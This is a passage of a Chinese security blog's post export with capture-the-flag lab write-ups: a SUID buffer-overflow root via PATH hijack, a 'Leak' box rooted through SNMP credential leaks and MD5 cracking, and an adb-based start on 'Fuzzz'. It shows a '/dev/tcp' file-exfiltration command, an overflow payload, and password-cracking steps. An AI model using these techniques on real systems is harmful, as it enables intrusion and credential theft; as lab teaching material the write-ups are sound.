groups=1000(ldz)\n```\n\n\uff08\u7528\u6237\u540d\u662f\u5728userLogin\u7684\u4f2ac\u91cc\u9762\u770b\u5230\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528ssh-keygen -l -f\u770b\uff09\u7ee7\u7eed\u627e\u4e1c\u897f\n\n```\nlocalhost:~$ ls -la\ntotal 28\ndrwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 .\ndrwxr-xr-x    3 root     root          4096 Apr 28 00:29 ..\n-rw-------    1 ldz      ldz             15 Jun 27 22:33 .ash_history\ndrwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .ssh\n-rw-------    1 ldz      ldz           4178 Jun 26 12:58 .viminfo\n-rw-------    1 ldz      ldz             39 Jun 24 10:12 user.txt\nlocalhost:~$ cat user.txt \nflag{ce6560c893e5cfec48e0fd186dc03718}\nlocalhost:~$ cat .viminfo \n# This viminfo file was generated by Vim 9.1.\n# You may edit it if you're careful!\n\n# Viminfo version\n|1,4\n\n# Value of 'encoding' when this file was written\n*encoding=utf-8\n\n\n# hlsearch on (H) or off (h):\n~h\n# Last Search Pattern:\n~MSle0~/Pub\n\n# Command Line History (newest to oldest):\n:wq\n|2,0,1750913922,,'wq'\n:q\n|2,0,1750913922,,'q'\n:q!\n|2,0,1750786392,,'q!'\n:Q\n|2,0,1750731057,,'Q'\n\n# Search String History (newest to oldest):\n?/Pub\n|2,1,1750769276,47,'Pub'\n\n# Expression History (newest to oldest):\n\n# Input Line History (newest to oldest):\n\n# Debug Line History (newest to oldest):\n\n# Registers:\n''1     LINE    0\n        vim .ash_history \n|3,1,1,1,1,0,1750913920,'vim .ash_history '\n'2      LINE    0\n        history \n|3,0,2,1,1,0,1750913920,'history '\n'3      LINE    0\n\n|3,0,3,1,1,0,1750913920,''\n'4      LINE    0\n            int flag = 0;\n|3,0,4,1,1,0,1750786253,'    int flag = 0;'\n\n# File marks:\n'0  1  0  ~/.ash_history\n|4,48,1,0,1750913922,'~/.ash_history'\n'1  13  12  /opt/vuln.c\n|4,49,13,12,1750786392,'/opt/vuln.c'\n'2  30  0  /opt/vuln.c\n|4,50,30,0,1750786258,'/opt/vuln.c'\n'3  30  0  /opt/vuln.c\n|4,51,30,0,1750786258,'/opt/vuln.c'\n'4  43  0  /etc/ssh/sshd_config\n|4,52,43,0,1750769292,'/etc/ssh/sshd_config'\n\n# Jumplist (newest first):\n-'  1  0  ~/.ash_history\n|4,39,1,0,1750913922,'~/.ash_history'\n-'  13  12  /opt/vuln.c\n|4,39,13,12,1750786392,'/opt/vuln.c'\n-'  13  12  /opt/vuln.c\n|4,39,13,12,1750786392,'/opt/vuln.c'\n-'  30  0  /opt/vuln.c\n|4,39,30,0,1750786357,'/opt/vuln.c'\n-'  30  0  /opt/vuln.c\n|4,39,30,0,1750786357,'/opt/vuln.c'\n-'  30  0  /opt/vuln.c\n|4,39,30,0,1750786258,'/opt/vuln.c'\n-'  30  0  /opt/vuln.c\n|4,39,30,0,1750786258,'/opt/vuln.c'\n-'  1  0  /opt/vuln.c\n|4,39,1,0,1750786255,'/opt/vuln.c'\n-'  1  0  /opt/vuln.c\n|4,39,1,0,1750786255,'/opt/vuln.c'\n-'  1  0  /opt/vuln.c\n|4,39,1,0,1750786255,'/opt/vuln.c'\n-'  1  0  /opt/vuln.c\n|4,39,1,0,1750786255,'/opt/vuln.c'\n-'  11  4  /opt/vuln.c\n|4,39,11,4,1750786254,'/opt/vuln.c'\n-'  11  4  /opt/vuln.c\n|4,39,11,4,1750786254,'/opt/vuln.c'\n-'  11  4  /opt/vuln.c\n|4,39,11,4,1750786254,'/opt/vuln.c'\n-'  11  4  /opt/vuln.c\n|4,39,11,4,1750786254,'/opt/vuln.c'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  43  0  /etc/ssh/sshd_config\n|4,39,43,0,1750769292,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  19  2  /etc/ssh/sshd_config\n|4,39,19,2,1750769276,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n-'  1  0  /etc/ssh/sshd_config\n|4,39,1,0,1750769258,'/etc/ssh/sshd_config'\n\n# History of marks within files (newest to oldest):\n\n> ~/.ash_history\n        *       1750913922      0\n        '       1       0\n        .       1       0\n        +       1       0\n\n> /opt/vuln.c\n        *       1750786390      0\n        '       13      12\n        ^       13      13\n        .       13      12\n        +       11      0\n        +       13      12\n\n> /etc/ssh/sshd_config\n        *       1750769290      0\n        '       43      0\n        ^       43      0\n        .       41      0\n        +       41      0\nlocalhost:~$ cd .ssh/\nlocalhost:~/.ssh$ ls -al\ntotal 28\ndrwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .\ndrwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 ..\n-rw-r--r--    1 ldz      ldz             95 Jun 24 20:51 authorized_keys\n-rw-------    1 ldz      ldz            399 Jun 24 20:43 id_ed25519\n-rw-r--r--    1 ldz      ldz             95 Jun 24 20:43 id_ed25519.pub\n-rw-------    1 ldz      ldz            828 Jun 25 13:18 known_hosts\n-rw-r--r--    1 ldz      ldz             92 Jun 25 13:18 known_hosts.old\nlocalhost:~/.ssh$ ssh-keygen -l -f id_ed25519\n256 SHA256:N14sJc5eu0fTD2oG9XrFil1dcsAbsSw3JjqW6vmwheg ldz@localhost (ED25519)\n```\n\n### 5.3 SUID\u63d0\u6743\u4e0ePATH\u52ab\u6301\n\n\u627e\u4e0d\u5230\uff0c\u770b\u5230vim\u7684\u5386\u53f2\u8bb0\u5f55\u6709\u4fee\u6539\u8fc7/opt/vuln\u53bb\u770b\u770b\n\n```\nlocalhost:~/.ssh$ cd /opt/\nlocalhost:/opt$ ls -al\ntotal 40\ndrwxr-xr-x    5 root     root          4096 Jun 25 01:42 .\ndrwxr-xr-x   21 root     root          4096 Jun 25 01:45 ..\ndrwx--x--x    4 root     root          4096 Jun 16 16:03 containerd\ndrw-------    2 root     root          4096 Jun 24 19:55 server\ndrw-------    3 root     root          4096 Jun 25 01:52 server2\n-rwsr-xr-x    1 root     root         19968 Jun 25 01:33 vuln\nlocalhost:/opt$ ./vuln \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nflag = 0\npassword wrong\n```\n\n\u6709\u70b9\u50cf\u6ea2\u51fa\uff0c\u62d6\u8fc7\u6765\u770b\u770b\n\u8001\u6837\u5b50\uff0ckali\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nc -lvnp 1234 > vuln     \nlistening on [any] 1234 ...\n\n```\n\n\u9776\u673a\u63a8\u9001\n\n```\nlocalhost:/opt$ cat vuln > /dev/tcp/192.168.205.128/1234\n-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory\nlocalhost:/opt$ which bash\n```\n\nok\uff0c\u90a3\u6ca1\u4e8b\u4e86\uff0c\u62ffscp\u63a8\n\n```\nlocalhost:/opt$ scp vuln kali@192.168.205.128:/mnt/hgfs/gx/x/tmp\nThe authenticity of host '192.168.205.128 (192.168.205.128)' can't be established.\nED25519 key fingerprint is SHA256:0EmnEbFZ1K2Otrqlk0b3OHH8M36kr43dnKXNZ9+mcLI.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes \nWarning: Permanently added '192.168.205.128' (ED25519) to the list of known hosts.\nkali@192.168.205.128's password: \nvuln                                                                                                                                            100%   20KB   8.9MB/s   00:00   \n```\n\n\u62d6\u53bbida\n\n```\nvoid __cdecl vuln()\n{\n  char buffer[32]; // [rsp+0h] [rbp-30h] BYREF\n  ssize_t n; // [rsp+20h] [rbp-10h]\n  int flag; // [rsp+2Ch] [rbp-4h]\n\n  flag = 0;\n  n = read(0, buffer, 0x30uLL);\n  if ( flag == 1 )\n  {\n    secret();\n  }\n  else\n  {\n    printf('flag = %d\\n', (unsigned int)flag);\n    puts('password wrong');\n  }\n}\n\nvoid __cdecl secret()\n{\n  setuid(0);\n  system('cat /etc/shadow');\n}\n```\n\n\u770b\u6765\u4e00\u4e0b\uff0c\u786e\u5b9e\u662f\u6ea2\u51fa\n\u4f60\u60f3\u62ffshell\u4e5f\u53ef\u4ee5\uff0c\u73a9\u6cd5\u633a\u591a\n\n```\nlocalhost:/opt$ id\nuid=1000(ldz) gid=1000(ldz) groups=1000(ldz)\nlocalhost:/opt$ tty\n/dev/pts/0\nlocalhost:/opt$ cd /home/ldz\nlocalhost:~$ echo '/bin/sh < /dev/pts/0' > cat\nlocalhost:~$ chmod +x cat\nlocalhost:~$ (printf 'A%.0s' $(seq 1 44); printf '\\x01\\x00\\x00\\x00') > p\nlocalhost:~$ xxd p\n00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA\n00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA\n00000020: 4141 4141 4141 4141 4141 4141 0100 0000  AAAAAAAAAAAA....\nlocalhost:~$ export PATH=/home/ldz:$PATH\nlocalhost:~$ cd /opt\nlocalhost:/opt$ ./vuln < /home/ldz/p\n/opt # id\nuid=0(root) gid=1000(ldz) groups=1000(ldz)\n/opt # export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$HOME/bin\n/opt # cat /root/root.txt \nflag{98ecb90d5dcef41e1bd18f47697f287a}\n```\n\n\u8bc4\u4ef7\u4e00\u4e0b\u8fd9\u4e2a\u9776\u673a\n![image-20250628094814909](https://7r1umphk.github.io/image/image20250628094815151.webp)\n\n\u54c8\u54c8\uff0c\u6ca1\u6253\u8fc7\u7684\u53ef\u4ee5\u671f\u5f85\u4e00\u624bsentence", "top": 0, "createdAt": 1751077214, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-28", "dateLabelColor": "#0969da"}, "P128": {"htmlDir": "docs/post/nei-bu-_Leak.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Leak", "postUrl": "post/nei-bu-_Leak.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/128", "commentNum": 0, "wordCount": 5470, "description": "## \u9776\u673a\u4fe1\u606f\n\n- **IP \u5730\u5740:** `192.168.205.161`\n- **\u653b\u51fb\u673a:** `192.168.205.128`\n\n---\n\n## \u4e00\u3001\u4fe1\u606f\u6536\u96c6\u4e0e\u670d\u52a1\u679a\u4e3e\n\n\u9996\u5148\uff0c\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3 TCP \u626b\u63cf\uff0c\u4ee5\u786e\u5b9a\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.161                 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 05:49 EDT\nNmap scan report for 192.168.205.161\nHost is up (0.00019s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:86:21:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.39 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u4e24\u4e2a\u7aef\u53e3\u3002\n\n\u63a5\u7740\uff0c\u8bbf\u95ee 80 \u7aef\u53e3\u7684 Web \u670d\u52a1\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u6a21\u4eff Kali Linux \u7ec8\u7aef\u7684\u9759\u6001\u9875\u9762\uff0c\u672a\u53d1\u73b0\u76f4\u63a5\u53ef\u5229\u7528\u7684\u529f\u80fd\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 192.168.205.161       \n<!DOCTYPE html>\n<html lang='en'>\n...\n```\n\n\u4f7f\u7528 `dirsearch` \u548c `gobuster` \u5bf9\u7f51\u7ad9\u76ee\u5f55\u8fdb\u884c\u626b\u63cf\uff0c\u672a\u53d1\u73b0\u9664\u4e3b\u9875\u5916\u7684\u5176\u4ed6\u6709\u7528\u8def\u5f84\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ dirsearch -u http://192.168.205.161               \n...\nTask Completed\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gobuster dir -u 192.168.205.161 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n...\n/index.html           (Status: 200) [Size: 15740]\n...\n```\n\n\u7531\u4e8e TCP \u626b\u63cf\u672a\u53d1\u73b0\u660e\u663e\u7a81\u7834\u53e3\uff0c\u63a5\u4e0b\u6765\u5bf9\u76ee\u6807\u8fdb\u884c UDP \u626b\u63cf\uff0c\u5bfb\u627e\u5176\u4ed6\u53ef\u80fd\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -sU --top-port 100 192.168.205.161\n...\nPORT    STATE SERVICE\n161/udp open  snmp\n...\n```\n\nUDP \u626b\u63cf\u53d1\u73b0 **161 (SNMP)** \u7aef\u53e3\u5f00\u653e\uff0c\u8fd9\u662f\u4e00\u4e2a\u5173\u952e\u53d1\u73b0\u3002SNMP \u670d\u52a1\u5e38\u56e0\u914d\u7f6e\u4e0d\u5f53\u800c\u6cc4\u9732\u5927\u91cf\u654f\u611f\u4fe1\u606f\u3002\n\n## \u4e8c\u3001SNMP \u4fe1\u606f\u6cc4\u9732\u4e0e\u6f0f\u6d1e\u5229\u7528\n\n\u5c1d\u8bd5\u4f7f\u7528\u9ed8\u8ba4\u7684 community string `public` \u6765\u8bfb\u53d6 SNMP \u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ snmpwalk -v2c -c public 192.168.205.161\n...\n```\n\n`snmpwalk` \u8fd4\u56de\u4e86\u6d77\u91cf\u4fe1\u606f\u3002\u4e3a\u4e86\u5feb\u901f\u5b9a\u4f4d\u6709\u7528\u6570\u636e\uff0c\u4f7f\u7528 `grep` \u8fc7\u6ee4\u5305\u542b `pass` \u7684\u884c\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ snmpwalk -v2c -c public 192.168.205.161|grep 'pass'\niso.3.6.1.2.1.25.4.2.1.4.331 = STRING: 'leak-service --login Shinozaki --pass ShinozakiAi'\niso.3.6.1.2.1.25.6.3.1.2.13 = STRING: 'base-passwd_3.5.46_amd64'\niso.3.6.1.2.1.25.6.3.1.2.480 = STRING: 'passwd_1:4.5-1.1_amd64'\n```\n\n\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4fe1\u606f\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u60ca\u4eba\u7684\u4fe1\u606f\u6cc4\u9732\uff1a\u4e00\u4e2a\u540d\u4e3a `leak-service` \u7684\u670d\u52a1\u542f\u52a8\u65f6\uff0c\u4ee5\u660e\u6587\u5f62\u5f0f\u4f20\u9012\u4e86\u767b\u5f55\u51ed\u8bc1 `Shinozaki:ShinozakiAi`\u3002\n\n\u540c\u65f6\uff0c\u5728 `snmpwalk` \u7684\u8f93\u51fa\u4e2d\u8fd8\u53d1\u73b0\u4e86\u57df\u540d\u4fe1\u606f `admin@sunset.leak.dsz`\u3002\u5c06 `leak.dsz` \u548c `sunset.leak.dsz` \u6dfb\u52a0\u5230\u672c\u5730 `/etc/hosts` \u6587\u4ef6\u4e2d\uff0c\u4ee5\u4fbf\u540e\u7eed\u6d4b\u8bd5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sudo vim /etc/hosts             \n...\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ tail -n 1 /etc/hosts                                    \n192.168.205.161 leak.dsz sunset.leak.dsz\n```\n\n\u518d\u6b21\u5bf9\u65b0\u53d1\u73b0\u7684\u57df\u540d\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c`sunset.leak.dsz` \u57df\u540d\u4e0b\u53d1\u73b0\u4e86\u4e00\u4e2a `/manager` \u8def\u5f84\uff0c\u8bbf\u95ee\u540e\u9700\u8981\u8ba4\u8bc1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ dirsearch -u http://sunset.leak.dsz \n...\n[05:56:17] 301 -  320B  - /manager  ->  http://sunset.leak.dsz/manager/\n[05:56:17] 401 -   24B  - /manager/\n...\n```\n\n\u662f\u4e00\u4e2a\u767b\u5f55\u7a97\u53e3\u3002\u4f7f\u7528\u524d\u9762\u6cc4\u9732\u7684\u51ed\u8bc1 `Shinozaki:ShinozakiAi` \u5c1d\u8bd5\u767b\u5f55\uff0c\u6210\u529f\u8fdb\u5165\u540e\u53f0\u3002\u5728\u540e\u53f0\u9875\u9762\u4e2d\uff0c\u53d1\u73b0\u4e86ssh\u7528\u6237 `ai` \u7684\u5bc6\u7801 MD5 \u54c8\u5e0c\u3002\n\n![image-20250701180035946](https://7r1umphk.github.io/image/20250701180036271.webp)\n\n- **\u7528\u6237:** `ai`\n- **MD5 Hash:** `d21715210cb6224f9ff4c075a8906fe9`\n\n## \u4e09\u3001\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\n\n\u73b0\u5728\uff0c\u6211\u4eec\u9700\u8981\u7834\u89e3\u8fd9\u4e2a MD5 \u54c8\u5e0c\u3002\u6839\u636e\u9875\u9762\u63d0\u793a\uff0c\u4f7f\u7528 `crunch` \u751f\u6210\u4e00\u4e2a\u4ee5 `baba` \u5f00\u5934\u76848\u4f4d\u5bc6\u7801\u5b57\u5178\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ crunch 8 8 -t baba@@@@ -o wordlist.txt\n...\n```\n\n\u5c06\u54c8\u5e0c\u4fdd\u5b58\u5230\u6587\u4ef6 `hash` \u4e2d\uff0c\u5e76\u4f7f\u7528 `John the Ripper` \u548c\u521a\u751f\u6210\u7684\u5b57\u5178\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat hash                              \nai:d21715210cb6224f9ff4c075a8906fe9\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --format=raw-md5 --wordlist=wordlist.txt hash\n...\nbabadawo         (ai)     \n...\nSession completed. \n```\n\n\u6210\u529f\u7834\u89e3\u5bc6\u7801\u4e3a `babadawo`\u3002\n\n\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u51ed\u8bc1 `ai:babadawo` \u5c1d\u8bd5 SSH \u767b\u5f55\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh ai@192.168.205.161\nai@192.168.205.161's password: \n...\nLast login: Tue Jul  1 05:13:09 2025 from 192.168.205.128\nai@Leak:~$\n```\n\n\u767b\u5f55\u6210\u529f\uff01\u73b0\u5728\u83b7\u53d6 `user.txt`\u3002\n\n```bash\nai@Leak:~$ cat user.txt \nflag{user-13421fec-559d-11f0-a1af-5f1558743b4d}\n```\n\n\u6210\u529f\u62ff\u5230\u7528\u6237 flag\u3002\n\n## \u56db\u3001\u6743\u9650\u63d0\u5347\n\n\u4e3a\u4e86\u63d0\u5347\u6743\u9650\uff0c\u9996\u5148\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u4e0a\u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\uff0c\u7279\u522b\u662f\u5bfb\u627e\u975e\u6807\u51c6\u7684\u6216\u81ea\u5b9a\u4e49\u7684\u5305\u3002\n\n```bash\nai@Leak:~$ dpkg -l |grep 'leak'\nii  leak-date                     1.0-1                                       amd64        Simple date and time display utility\nii  liblsan0:amd64                10.2.1-6                                    amd64        LeakSanitizer -- a memory leak detector (runtime)\n```\n\n\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `leak-date` \u7684\u53ef\u7591\u8f6f\u4ef6\u5305\u3002\u67e5\u770b\u5176\u8be6\u7ec6\u4fe1\u606f\u3002\n\n```bash\nai@Leak:~$ dpkg -s leak-date\nPackage: leak-date\nStatus: install ok installed\nPriority: optional\nSection: utils\nInstalled-Size: 500\nMaintainer: Security Admin <admin@leak.dsz>\nArchitecture: amd64\nVersion: 1.0-1\nDescription: Simple date and time display utility\n This package provides a minimal CLI utility to display\n the current system date and time. Ideal for scripts and\n system monitoring. SECURITY NOTICE: System debug token\n IMKCFRunLoopWakeUpReliable for root access.\n```\n\n\u5728\u8f6f\u4ef6\u5305\u7684\u63cf\u8ff0\u4fe1\u606f\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u6761\u81f3\u5173\u91cd\u8981\u7684\u5b89\u5168\u63d0\u793a\uff1a`SECURITY NOTICE: System debug token IMKCFRunLoopWakeUpReliable for root access.`\u3002\u8fd9\u4e32\u5b57\u7b26 `IMKCFRunLoopWakeUpReliable` \u6781\u6709\u53ef\u80fd\u5c31\u662f root \u7528\u6237\u7684\u5bc6\u7801\u3002\n\n\u4f7f\u7528 `su -` \u5207\u6362\u5230 root \u7528\u6237\uff0c\u5e76\u8f93\u5165\u8fd9\u4e32\u5b57\u7b26\u4f5c\u4e3a\u5bc6\u7801\u3002\n\n```bash\nai@Leak:~$ su - \nPassword: \nroot@Leak:~#\n```\n\n\u6210\u529f\u5207\u6362\u5230 root \u7528\u6237\uff01\u73b0\u5728\u8bfb\u53d6\u6700\u7ec8\u7684 root flag\u3002\n\n```bash\nroot@Leak:~# cat /root/root.txt \nflag{root-357d3d08-5598-11f0-a27e-639fd7e7110b}\n```sentence", "top": 0, "createdAt": 1751368183, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-01", "dateLabelColor": "#0969da"}, "P129": {"htmlDir": "docs/post/hmv_Fuzzz.html", "labels": ["HackMyVM"], "postTitle": "hmv_Fuzzz", "postUrl": "post/hmv_Fuzzz.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/129", "commentNum": 0, "wordCount": 28637, "description": "```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                   \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.163 08:00:27:38:b0:90       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:e4:9a:30       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.285 seconds (112.04 hosts/sec). 4 responded\n                                                                                                   \n```\n\n192.168.205.163\n\n\u670d\u52a1\u63a2\u6d4b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.163\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT\nNmap scan report for 192.168.205.163\nHost is up (0.00041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5555/tcp open  freeciv\nMAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.55 seconds                       \n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p5555 -sV 192.168.205.163\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT\nNmap scan report for 192.168.205.163\nHost is up (0.00035s latency).\n\nPORT     STATE SERVICE VERSION\n5555/tcp open  adb     Android Debug Bridge (token auth required)\nMAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Android; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.40 seconds\n```\n\nadb\uff0c\u8fde\u63a5\u4e0a\u53bb\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ adb connect 192.168.205.163:5555\nconnected to 192.168.205.163:5555\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ adb devices                     \nList of devices attached\n192.168.205.163:5555    device\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ adb shell  \n/ $ id\nuid=1000(runner) gid=1000(runner) groups=1000(runner)\n/ $ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\nFor security reasons, the password you type will not be visible.\n\n[sudo] password for runner: \nsudo: a password is required\n/ $ cd \n~ $ ls -al\ntotal 8\ndrwx------    2 runner   runner        4096 May 19 09:08 .\ndrwxr-xr-x    4 root     root          4096 May 19 10:02 ..\nlrwxrwxrwx    1 root     runner           9 May 19 09:08 .ash_history -> /dev/null\n~ $ ss -tnlp\n/bin/sh: ss: not found\n~ $ netstat -lntup\nnetstat: showing only processes with your user ID\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2513/python3\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 :::22                   :::*                    LISTEN      